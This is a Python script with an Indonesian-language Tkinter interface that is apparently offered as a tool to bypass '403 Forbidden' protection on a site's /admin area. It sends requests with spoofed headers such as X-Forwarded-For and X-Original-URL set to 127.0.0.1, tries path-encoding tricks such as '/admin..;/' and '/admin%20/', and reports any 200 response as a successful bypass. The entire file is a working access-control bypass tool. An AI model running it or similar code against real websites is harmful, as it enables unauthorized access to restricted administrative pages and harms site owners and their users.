import tkinter as tk
from tkinter import ttk, scrolledtext
import requests

# Metode header & path bypass
headers_list = [
    {"X-Original-URL": "/admin"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"Referer": "https://google.com"},
]

path_tricks = [
    "/admin/",
    "/admin..;/",
    "/admin%20/",
    "/admin?anything",
    "/admin/..;/",
    "/admin;/",
    "/admin//",
]

# Bypass function
def run_bypass():
    url = entry_url.get().strip()
    output.delete(1.0, tk.END)

    if not url:
        output.insert(tk.END, "❌ Masukkan URL terlebih dahulu!\n")
        return

    output.insert(tk.END, f"🎯 Mulai bypass untuk: {url}\n\n")

    # Test header-based bypass
    output.insert(tk.END, "🔍 [Header Injection Test]\n")
    for headers in headers_list:
        try:
            res = requests.get(url, headers=headers, timeout=5)
            status = res.status_code
            output.insert(tk.END, f"➡️ {headers} → Status: {status}\n")
            if status == 200:
                output.insert(tk.END, f"✅ BYPASS BERHASIL DENGAN HEADER: {headers}\n")
        except:
            output.insert(tk.END, f"❌ Gagal konek pakai headers: {headers}\n")

    # Test path tricks
    output.insert(tk.END, "\n🔍 [Path Manipulation Test]\n")
    for trick in path_tricks:
        test_url = url.rstrip("/") + trick
        try:
            res = requests.get(test_url, timeout=5)
            status = res.status_code
            output.insert(tk.END, f"➡️ {test_url} → Status: {status}\n")
            if status == 200:
                output.insert(tk.END, f"✅ BYPASS BERHASIL DENGAN PATH: {test_url}\n")
        except:
            output.insert(tk.END, f"❌ Gagal konek ke: {test_url}\n")

# GUI
app = tk.Tk()
app.title("🔥 Bypass 403 Forbidden - GUI Edition")
app.geometry("700x500")
app.configure(bg="#1f1f1f")

style = ttk.Style(app)
style.configure("TButton", font=("Consolas", 10), padding=6)
style.configure("TLabel", background="#1f1f1f", foreground="white", font=("Consolas", 10))
style.configure("TEntry", font=("Consolas", 10))

ttk.Label(app, text="🔒 Target URL:").pack(pady=5)
entry_url = ttk.Entry(app, width=80)
entry_url.pack()

ttk.Button(app, text="🚀 Mulai Bypass", command=run_bypass).pack(pady=10)

output = scrolledtext.ScrolledText(app, wrap=tk.WORD, width=90, height=25, bg="#2a2a2a", fg="white", font=("Consolas", 10))
output.pack(pady=10)

app.mainloop()
